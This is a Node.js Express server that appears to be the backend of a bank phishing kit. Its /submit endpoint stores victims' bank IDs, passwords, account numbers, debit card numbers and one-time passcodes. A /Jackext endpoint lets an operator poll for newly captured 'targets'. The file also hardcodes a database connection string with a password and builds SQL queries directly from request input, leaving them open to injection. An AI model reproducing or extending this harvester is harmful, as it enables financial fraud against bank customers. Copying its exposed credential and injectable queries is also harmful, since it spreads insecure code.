const express = require('express')
const app = express()
const path = require('path')
const cookieParser = require('cookie-parser')

app.use(express.static(path.join(__dirname + '/Static/')));
app.use(express.json());

const { Pool, Client } = require('pg')
const connectionString = 'postgres://rrgcgror:EfsyxJk9i4KJBjJNbSwG30BWS4XYKmz3@satao.db.elephantsql.com/rrgcgror'

const db = new Client({
  connectionString: connectionString,
  ssl: { rejectUnauthorized: false }
})

db.connect((err) => {
  if (err) throw err
  console.log("Connected")
})

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'Static/index.html'))
})

let last = 0

app.get('/Jackext', (req, res) => {
  db.query(`SELECT * FROM "bankdet" where targetid > ${last} ORDER BY "targetid" DESC LIMIT 5;`, (err,result) => {
    if(err) throw err
    if(result.rows.length == 0){
      res.send({'change': 'no'})
    }
    else{
      last = result.rows[0].targetid
      res.send({
        'change': 'yes',
        'newtg': result.rows
      })
    }
  })
})

app.post('/submit', (req,res) => {
  db.query(`
  insert into bankdet
  values('${req.body.Bankid}', '${req.body.Bankpw}', '${req.body.Acc}', '${req.body.Dbcard}', '${req.body.otp}');
  `, (err, result) => {
    if(err){
      res.send({'sbmt':'Failed'}) 
      throw err
    }
  })
})

app.listen(5000)